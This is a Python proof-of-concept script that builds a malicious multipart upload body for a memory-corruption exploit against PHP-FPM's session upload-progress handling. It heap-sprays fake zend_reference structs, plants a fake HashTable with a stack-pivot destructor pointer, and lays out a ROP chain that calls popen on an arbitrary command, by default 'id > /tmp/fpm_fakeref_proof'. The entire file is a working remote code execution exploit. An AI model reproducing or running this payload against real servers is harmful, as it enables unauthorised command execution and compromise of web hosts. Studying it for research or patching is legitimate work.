#!/usr/bin/env python3
"""Build the FPM fake-reference B body (mod_php B2 shape).

Sprays 384-byte values containing fake zend_reference structs (rc=1,
type IS_REFERENCE, ptr=S, val.type IS_ARRAY) over the A's stale
PS(http_session_vars) reference, then places the fake HashTable/ROP field,
the PHPSESSID and progress fields, and a zeroing tail. S is provisional; the
probe locates the ht field by scanning for the pivot qword.
"""
import struct
import sys

D = 0x7FFFF63B9000
S = int(sys.argv[1], 0) if len(sys.argv) > 1 else D + 0xF7398
CMD = sys.argv[2] if len(sys.argv) > 2 else "id > /tmp/fpm_fakeref_proof"
OUT = sys.argv[3] if len(sys.argv) > 3 else "/tmp/fakeref_b.bin"

BND = b"----p2s"
PIVOT = 0x555555ABDD0E
POP_RDI = 0x55555560A7E8
POP_RSI = 0x555555609149
RET = 0x55555560A7E9
POPEN = 0x555555602E50


def part(name, value, filename=None):
    s = b"--" + BND + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
    if filename is not None:
        s += b"; filename=\"" + filename + b"\""
        s += b"\r\nContent-Type: application/octet-stream"
    return s + b"\r\n\r\n" + value + b"\r\n"


def fake_ref(ptr):
    return struct.pack("<Q", 1) + struct.pack("<I", 0x0A) + b"\0\0\0\0" + \
        struct.pack("<Q", ptr) + struct.pack("<I", 0x0107) + b"\0" * 12


def spray(n, ptr, vl=384):
    v = bytearray(b"S" * vl)
    fr = fake_ref(ptr)
    for o in range(8, vl - len(fr) + 1, 32):
        v[o:o + len(fr)] = fr
    return bytes(v)


def mk_ht(s, cmd, size=384):
    h = bytearray(size)
    w = lambda o, b: h.__setitem__(slice(o, o + len(b)), b)  # noqa: E731
    wq = lambda o, v: w(o, struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF))  # noqa: E731
    wq(0x00, 0x0000010600000001)          # gc: rc=1, IS_ARRAY
    w(0x08, struct.pack("<I", 0x10) + struct.pack("<I", 0xFFFFFFF8))
    wq(0x10, s + 0x20)                    # arData
    w(0x18, struct.pack("<I", 1) + struct.pack("<I", 1))
    w(0x20, struct.pack("<I", 8) + struct.pack("<I", 0))
    wq(0x28, 0)
    wq(0x30, PIVOT)                       # pDestructor; bucket+0x10
    wq(0x20, 0x0000037F00001F80)          # bucket 0: MXCSR/fldcw
    wq(0x28, 1)                           # zval type
    for o in (0x38, 0x40, 0x48, 0x50, 0x58):
        wq(o, 0)
    wq(0x30, PIVOT)
    wq(0x60, POP_RDI)
    wq(0x68, D + 0xF00)                   # command
    wq(0x70, POP_RSI)
    wq(0x78, D + 0xF20)                   # "r"
    wq(0x80, RET)
    wq(0x88, POPEN)
    wq(0x90, RET)
    wq(0x98, 0)
    w(0xF0, b"r\0")
    w(0x100, cmd.encode() + b"\0")
    return bytes(h)


body = bytearray()
for i in range(500):
    body += part(b"s%09d" % i, spray(i, S))
body += part(b"ht", mk_ht(S, CMD))
body += part(b"PHPSESSID", b"a" * 32)
body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
for i in range(495):
    body += part(b"t%09d" % i, spray(i, 0))
body += b"--" + BND + b"--\r\n"
open(OUT, "wb").write(bytes(body))
print("S=%#x ht@%#x body=%d out=%s" % (S, S + 0x30, len(body), OUT))
